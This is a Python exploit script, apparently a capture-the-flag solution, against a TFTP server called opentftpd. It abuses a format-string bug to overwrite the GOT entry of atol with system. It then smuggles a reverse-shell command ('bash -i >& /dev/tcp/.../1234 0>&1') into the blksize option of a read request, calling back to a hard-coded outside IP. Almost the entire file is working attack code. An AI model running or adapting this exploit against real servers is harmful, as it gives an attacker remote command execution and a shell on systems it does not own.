#!/usr/bin/env python
import sys, os
from pwn import *
from time import sleep
from binascii import hexlify

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('0.0.0.0', 5566)
elf = ELF('docker/source/opentftpd'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def fmtchar(prev, word, idx, byte = 1):
    typ = {0: '$p', 1: '$hhn', 2: '$hn', 4: '$n'}
    cnt = word - prev if word - prev >= 0 else 256**byte - prev + word
    pad = '' if word == prev else '%{}c'.format(cnt)
    return '{}%{}{}'.format(pad, idx, typ[byte])

def read_req(r, filename, mode='ascii', blksize=512, timeout=3):
    r.send('\x00\x01{}\x00{}\x00blksize\x00{}\x00timeout\x00{}'.format(filename, mode, blksize, timeout))
    r.recv(timeout=0.1)

def send_exp(r, off, exp):
    idx = len(exp)
    for i in range(len(exp))[::-1]:
        if exp[i] == '\x00':
            _ = flat('\x00\x05', p16(0), ''.ljust(off+i+1, '\x21'), exp[i+1:idx]); r.send(_)
            log.debug(hexlify(_))
            idx = i
    _ = flat('\x00\x05', p16(0), ''.ljust(off, '\x21'), exp[:idx]); r.send(_)
    log.debug(hexlify(_))

fmt_off1 = 134 + 9
fmt_off2 = 302 + 9

r = remote(HOST, PORT, typ='udp')

myip = '127.0.0.1'
errmsg = 'Client {}:{}, Error 0 at Client, '.format(myip, r.lport)
prev_len = len(errmsg)

send_exp(r, 0, fmtchar(prev_len, elf.got['atol'], fmt_off1, byte=4)) 
send_exp(r, 0, fmtchar(prev_len, elf.sym['system'], fmt_off2, byte=4))
send_exp(r, 0, fmtchar(prev_len, elf.got['atol'] + 4, fmt_off1, byte=4))
send_exp(r, 0, fmtchar(prev_len, 0, fmt_off2, byte=4))

r.close()

r = remote(HOST, PORT, typ='udp')

remote_ip = '128.61.240.205' # edit this if your machine is not pwnable.kr
log.warning('system("bash -i >& /dev/tcp/$ip/5566 0>&1")')
read_req(r, filename='gg', blksize='bash -c "bash -i >& /dev/tcp/{}/1234 0>&1"'.format(remote_ip))

r.close()
